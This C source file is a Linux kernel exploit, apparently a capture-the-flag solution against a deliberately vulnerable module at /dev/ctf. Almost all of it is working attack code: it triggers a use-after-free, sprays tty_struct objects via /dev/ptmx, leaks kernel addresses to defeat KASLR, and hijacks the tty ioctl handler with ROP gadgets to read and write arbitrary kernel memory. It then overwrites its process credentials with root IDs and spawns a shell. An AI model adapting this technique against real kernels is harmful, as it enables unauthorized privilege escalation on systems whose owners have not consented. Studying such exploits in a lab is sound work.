/*
Use-after-free kernel exploit that overwrites a function pointer in tty_struct->ops to create
arbitrary-address-read 32 and arbitrary-address-write 32 primitives.

Escalation of privileges is obtained by searching for and overwriting the current process's 
task_struct->cred with root-privileges.

Bypasses SMEP, SMAP, and KASLR.

gcc poc.c -o poc
*/
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

int spray[50];
int cache_fd = -1;
int fd = -1;

char buf[0x400] = {};

unsigned long kbase;
unsigned long kheap;

// xgadget -r -f 'mov eax, .*' -l 2 vmlinux
// 0xffffffff812359f5: mov eax, [rdx]; ret;
#define rop_read_eax_from_ptr_rdx (kbase + 0x2359f5)
// xgadget -r -f 'mov .*, rcx' -l 2 vmlinux
// 0xffffffff81056db7: mov [rdx], rcx; ret;
#define rop_write_rcx_to_ptr_rdx (kbase + 0x056db7)

/*
gef> ktask
[+] Wait for memory scan
------------------------------------ Kernel tasks (heuristic) ------------------------------------
[+] init_task: 0xffffffff82414d28
[+] offsetof(task_struct, tasks): 0x0
[+] Number of tasks: 44
[+] offsetof(task_struct, comm): 0x2e0
[+] offsetof(task_struct, cred): 0x2d0
[+] offsetof(cred, uid): 0x4
task              : task->comm       task->cred         [uid,gid,suid,sgid,euid,egid,fsuid,fsgid]
0xffffffff82414d28: swapper/0        0xffffffff8244d540 [0, 0, 0, 0, 0, 0, 0, 0]
*/
#define init_task (kbase + 0x1414d28)
#define ofs_comm 0x2e0

void fatal(char * msg) {
    perror(msg);
    exit(1);
}

/*
    Vulnerable kernel module 'ctf.c' contains a use-after-free (UAF) vulnerability.

    - ioctl command-code '1337' provides an arbitrarily-sized kernel allocation less-than 2000
    - ioctl command-code '1338' will free the previously mentioned kernel allocation without
      NULL'ing the pointer, leaving it dangling. So long as the file-descriptor to the
      kernel module's character device remains open, reads and writes can continue to be made
      resulting in use-after-free conditions.
*/
int do_uaf() {
    int a = open("/dev/ctf", O_RDWR, 0);
    if (a < 0) {
        fatal("[-] Failed to open vuln kern module!");
    }

    printf("[*] Preparing UAF on dev fd [%d]...\n", a);
    ioctl(a, 1337, (void *) 0x400); // kptr = kmalloc(0x400)
    ioctl(a, 1338);                 // free(kptr)

    return a;
}

/*
    Use the dangling pointer to overwrite an overlapping tty_struct->ops ioctl() handler
    with a 'mov eax, [rdx]; ret' ROP gadget to perform an arbitrary-address-read primitive.
*/
unsigned int aar32(unsigned long addr) {
    if (cache_fd == -1) {
        unsigned long * fun_table = (unsigned long *) &buf;
        // Fake tty_struct->ops->ioctl() 
        fun_table[0xc] = rop_read_eax_from_ptr_rdx;
        // Set tty_struct->ops to point to the beginning of the tty_struct.
        *(unsigned long *) &buf[0x18] = kheap;
        // Use-after-free write of the dangling pointer accessible using file-descriptor 'fd'
        // to overwrite the overlapping tty_struct object.
        write(fd, buf, 0x400);
    }

    if (cache_fd == -1) {
        for (int i = 0 ; i < 50; i++) {
            // ioctl(..., rcx, rdx) -> mov eax, [rdx] -> mov rv, [addr]
            int rv = ioctl(spray[i], 0, addr);
            if (rv != -1) {
                /*
                    The overwritten tty_struct used for
                    arbitrary-address-read was found! Save the fd to speed
                    up the exploit's performance and forgo the search.
                */
                cache_fd = spray[i];
                return rv;
            }
        }
    } else {
        return ioctl(cache_fd, 0, addr);
    }
}

unsigned long aar64(unsigned long addr) {
    unsigned int lo = aar32(addr);
    unsigned long hi = ((unsigned long) aar32(addr + 4)) << 32;
    unsigned long data = hi | lo;
    return data;
}

/*
    Use the dangling pointer to overwrite an overlapping tty_struct->ops ioctl() handler
    with a 'mov [rdx], rcx; ret' ROP gadget to perform an arbitrary-address-write primitive.
*/
void aaw32(unsigned long addr, unsigned int data) {
    unsigned long * fun_table = (unsigned long *) &buf;
    // Fake tty_struct->ops->ioctl() 
    fun_table[0xc] = rop_write_rcx_to_ptr_rdx;
        
    // Set tty_struct->ops to point to the beginning of the tty_struct.
    *(unsigned long *) &buf[0x18] = kheap;

    // Use-after-free write of the dangling pointer accessible using file-descriptor 'fd'
    // to overwrite the overlapping tty_struct object.
    write(fd, buf, 0x400);

    // ioctl(..., rcx, rdx) -> mov [rdx], rcx -> mov [addr], data
    ioctl(cache_fd, data, addr);
}

int main() {
    fd = do_uaf();

    /*
        Overlap the previously freed memory with a 'tty_struct' object.
    */
    puts("[*] Spraying a victim object for the dangling pointer...");
    for (int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] < 0) {
            fatal("[-] Failed to open /dev/ptmx");
        }
    }

    puts("[*] Leaking with UAF read...");
    /*
        Using the dangling pointer, perform a use-after-free read to leak fields from
        the overlapped 'tty_struct' object.
    */
    read(fd, buf, 0x400);

    /*
        Leak a kernel code pointer and kernel heap pointer from 'tty_struct'

    tty_struct->ops : kcode = 0xffffffff820745e0
    maybe tty_struct->link : kheap = 0xffff8880043d5038
    # head /proc/kallsyms
    ffffffff81000000 T startup_64
    */
    kbase = *(unsigned long *) &buf[0x18] - 0x10745e0;
    kheap = *(unsigned long *) &buf[0x38] - 0x38;
    printf("[+] kbase = 0x%016lx\n", kbase);
    printf("[+] kheap = 0x%016lx\n", kheap);

    /*
        Set task_struct->comm as a searchable MAGIC string.
    */
    if (prctl(PR_SET_NAME, "sugondez") != 0) {
        fatal("[-] Failed to set task_struct->comm name!");
    }

    // Compute init_task based on the leaked kernel base.
    unsigned long curr_task = init_task;
    unsigned long comm_addr = curr_task + ofs_comm;
    // Search the task-list for a matching task_struct->comm to identify the current task.
    while (1) {
        printf("[*] Checking task_struct @ 0x%016lx\n", curr_task);
        printf("[*] task_struct->comm is @ 0x%016lx\n", comm_addr);

        unsigned long name = aar64(comm_addr);
        printf("[+] task_struct->comm is %s\n", &name);

        if (aar32(comm_addr) == 0x6f677573 /* ogus */
            && aar32(comm_addr + 4) == 0x7a65646e /* zedn */ ) {
            printf("[+] Found task_struct->comm at 0x%016lx\n", comm_addr);
            break;
        }
        curr_task = aar64(curr_task);
        comm_addr = curr_task + ofs_comm;
    }

    // Leak task_struct->cred
    unsigned long cred_addr = 0;
    cred_addr |= aar32(comm_addr - 16);
    cred_addr |= (unsigned long) aar32(comm_addr - 12) << 32;
    printf("[+] current->cred = 0x%016lx\n", cred_addr);

    // Overwrite task_struct->cred with root-privileges
    for (int i = 1; i < 9; i++) {
        aaw32(cred_addr + i*4, 0); // id=0 (root)
    }

    puts("[+] aaw32 cred overwrite wins (+smep, +smap, +kpti)!");
    system("/bin/sh");

    return 0;
}
